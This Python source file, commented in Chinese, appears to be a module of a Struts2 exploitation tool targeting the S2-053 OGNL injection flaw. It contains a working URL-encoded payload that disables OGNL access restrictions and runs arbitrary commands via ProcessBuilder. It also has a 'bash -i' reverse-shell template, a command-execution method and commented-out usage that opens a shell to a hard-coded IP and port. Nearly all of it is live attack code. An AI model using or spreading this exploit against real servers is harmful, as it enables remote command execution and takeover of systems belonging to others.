import re
from exploit import tools
import urllib.parse
import random

class S2_053:
    """S2-053漏洞检测利用类"""
    info = "[+] S2-053:影响版本Struts 2.0.1-2.3.33,2.5-2.5.10; POST请求发送数据; 默认参数为:username,password; 支持任意命令执行和反弹Linux shell"
    check_poc = "%25%7B{num1}%2B{num2}%7D"
    exec_payload = "%25%7B(%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23_memberAccess%3F(%23_memberAccess%3D%23dm)%3A((%23container%3D%23context%5B'com.opensymphony.xwork2.ActionContext.container'%5D).(%23ognlUtil%3D%23container.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ognlUtil.getExcludedPackageNames().clear()).(%23ognlUtil.getExcludedClasses().clear()).(%23context.setMemberAccess(%23dm)))).(%23cmd%3D'{cmd}').(%23iswin%3D(%40java.lang.System%40getProperty('os.name').toLowerCase().contains('win'))).(%23cmds%3D(%23iswin%3F%7B'cmd.exe'%2C'%2Fc'%2C%23cmd%7D%3A%7B'%2Fbin%2Fbash'%2C'-c'%2C%23cmd%7D)).(%23p%3Dnew%20java.lang.ProcessBuilder(%23cmds)).(%23p.redirectErrorStream(true)).(%23process%3D%23p.start()).(%40org.apache.commons.io.IOUtils%40toString(%23process.getInputStream()))%7D%0A"
    shell = "{echo,SHELL}|{base64,-d}|{bash,-i}"

    def __init__(self, url, data=None, headers=None, encoding="UTF-8"):
        if "?" in url:
            self.url = url.split("?")[0].strip()
        else:
            self.url = url
        if not data:
            self.data = "username=test&password={exp}"
        else:
            self.data = data
        self.headers = tools.parser_headers(headers)
        self.encoding = encoding
        self.is_vul = False
        if 'Content-Type' not in self.headers:
            self.headers['Content-Type'] = 'application/x-www-form-urlencoded'

    def check(self):
        """检测漏洞是否存在"""
        num1 = random.randint(10000, 100000)
        num2 = random.randint(10000, 100000)
        poc = self.check_poc.format(num1=num1, num2=num2)
        data = self.data.format(exp=poc)
        html = tools.post_stream(self.url, data, self.headers, self.encoding)
        num_sum = str(num1 + num2)
        if html.startswith("ERROR:"):
            return html
        elif num_sum in html:
            self.is_vul = True
            return 'S2-053'
        html = tools.echo_check(self)
        if str(html).startswith("ERROR:"):
            return html
        if html:
            self.is_vul = True
            return 'S2-053'
        return self.is_vul

    def exec_cmd(self, cmd):
        """执行命令"""
        cmd = "echo success &" + cmd
        data = self.data.format(exp=self.exec_payload.format(cmd=urllib.parse.quote(cmd)))
        html = tools.post(self.url, data, self.headers, self.encoding)
        pattern = re.compile(r'(?<=success.)(.*?)(?=..;)', re.S)
        re_result = re.findall(pattern, html)
        if re_result:
            html = re_result[0]
            return html
        else:
            return "[!] Command execution may not be successful"

    def reverse_shell(self, ip, port):
        """反弹shell"""
        html = tools.reverse_shell(self, ip, port)
        return html

# if __name__ == '__main__':
#     s = S2_053("http://192.168.217.138:8080/S2-053/", data='name={exp}')
#     tools._proxies = proxies = {
#         "http":"127.0.0.1:8080",
#         "https":"127.0.0.1:8080"
#     }
#     print(s.check())
#     print(s.exec_cmd('ls -l'))
#     s.reverse_shell('192.168.3.134', '4444')